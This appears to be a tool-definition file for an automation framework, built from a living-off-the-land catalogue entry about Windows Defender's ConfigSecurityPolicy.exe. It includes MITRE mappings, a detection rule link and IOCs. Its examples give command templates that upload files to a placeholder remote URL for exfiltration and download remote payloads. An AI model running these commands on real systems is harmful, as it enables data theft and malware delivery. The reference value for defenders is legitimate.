---
id: windows-download-configsecuritypolicy
namespace: windows:download:configsecuritypolicy
name: configsecuritypolicy
description: 'Binary part of Windows Defender. Used to manage settings in Windows Defender. You can configure different pilot collections for each of the co-management workloads. Being able to use different pilot collections allows you to take a more granular approach when shifting workloads. Located at: C:\Program Files\Windows Defender\ConfigSecurityPolicy.exe; C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\ConfigSecurityPolicy.exe.'
author: Ialle Teixeira
version: 1.0.0
capabilities:
- network.transfer.upload
- network.transfer.download
platforms:
- windows
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - network_traffic
  resource_cost:
    cpu: low
    memory_mb: 16
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
- configsecuritypolicy
parameters: []
features: []
execution:
  template: configsecuritypolicy
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Upload file, credentials or data exfiltration in general (Upload file)
  command: ConfigSecurityPolicy.exe {PATH_ABSOLUTE} {REMOTEURL}
- description: It will download a remote payload and place it in INetCache. (Downloads payload from remote server)
  command: ConfigSecurityPolicy.exe {REMOTEURL}
references:
- label: how-to-switch-workloads
  url: https://docs.microsoft.com/en-US/mem/configmgr/comanage/how-to-switch-workloads
- label: workloads
  url: https://docs.microsoft.com/en-US/mem/configmgr/comanage/workloads
- label: how-to-monitor
  url: https://docs.microsoft.com/en-US/mem/configmgr/comanage/how-to-monitor
- label: 1302589153570365440?s=20
  url: https://twitter.com/NtSetDefault/status/1302589153570365440?s=20
techniques:
- exfiltration
mitre_ids:
- T1567
- T1105
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_configsecuritypolicy.yml
- type: ioc
  description: ConfigSecurityPolicy storing data into alternate data streams.
- type: ioc
  description: Preventing/Detecting ConfigSecurityPolicy with non-RFC1918 addresses by Network IPS/IDS.
- type: ioc
  description: Monitor process creation for non-SYSTEM and non-LOCAL SERVICE accounts launching ConfigSecurityPolicy.exe.
- type: ioc
  description: User Agent is "MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)"
install:
- method: choco
  package_name: configsecuritypolicy
  commands:
  - choco install configsecuritypolicy
---


# configsecuritypolicy

configsecuritypolicy is a Windows LOLBin. Binary part of Windows Defender. Used to manage settings in Windows Defender. You can configure different pilot collections for each of the co-management workloads. Being able to use different pilot collections allows you to take a more granular approach when shifting workloads. Located at: C:\Program Files\Windows Defender\ConfigSecurityPolicy.exe; C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\ConfigSecurityPolicy.exe.
